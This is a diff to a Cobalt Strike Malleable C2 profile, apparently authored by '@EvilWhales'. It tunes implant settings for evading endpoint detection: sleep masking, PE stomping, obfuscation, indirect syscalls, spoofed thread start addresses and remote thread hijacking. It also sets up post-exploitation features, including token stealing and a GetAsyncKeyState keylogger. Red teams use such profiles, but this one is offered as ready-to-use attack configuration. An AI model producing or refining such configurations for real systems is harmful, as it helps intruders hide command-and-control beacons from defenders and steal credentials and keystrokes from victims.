@@ -1,4 +1,6 @@
 #
+# CFS - Complete Corrected Profile
+# Author: @EvilWhales
 # Full version with all settings preserved
 #
 
@@ -6,7 +8,7 @@
 ## Global Settings
 ###############################################################################
 
-set sample_name "letme";
+set sample_name "cfs";
 set host_stage "false";
 set useragent "<RAND>";
 set pipename "Winsock2\\CatalogChangeListener-####-0";
@@ -14,7 +16,6 @@ set pipename_stager "\\\\.\\pipe\\Winsock2\\CatalogChange####-####-0";
 set create_remote_thread "true";
 set hijack_remote_thread "true";
 set tasks_max_size "2097152";
-set steal_token "true";
 set steal_token_access_mask "0";
 set sleeptime "30000";
 set jitter "33";
@@ -32,12 +33,7 @@ stage {
     set sleep_mask "true";
     set stomppe "true";
     set obfuscate "true";
-    set rdl_load "PrependLoader";
-    set rdll_loader "true";
-    set rdll_use_syscalls "true";
-    set eaf_bypass "true";
-    set cleanup_store_size "true";
-    set sleep_mask "indirect";
+    set sleep_mask "true";
     set syscall_mask "indirect";
     
     # Magic bytes
@@ -120,7 +116,6 @@ post-ex {
     set keylogger "GetAsyncKeyState";
     
     # Thread hints
-    set threadhint "ntdll.dll!RtlUserThreadStart+0x21";
     #set threadhint "ntdll.dll!RtlUserThreadStart+0x9";
     #set threadhint "kernel32.dll!BaseThreadInitThunk+0x14";
     
@@ -1071,7 +1066,9 @@ post-ex {
 ###############################################################################
 
 process-inject {
+    set steal_token "true";
     set allocator "VirtualAllocEx";
+    set threadhint "ntdll.dll!RtlUserThreadStart+0x21";
     set startrwx "false";
     set userwx "false";
     set min_alloc "16384";
@@ -1185,12 +1182,4 @@ https-certificate {
     # For imported certificate
     # set keystore "domain.store";
     # set password "password";
-}
-
-###############################################################################
-## Execute Block
-###############################################################################
-
-execute {
-    # Default execute block
 }
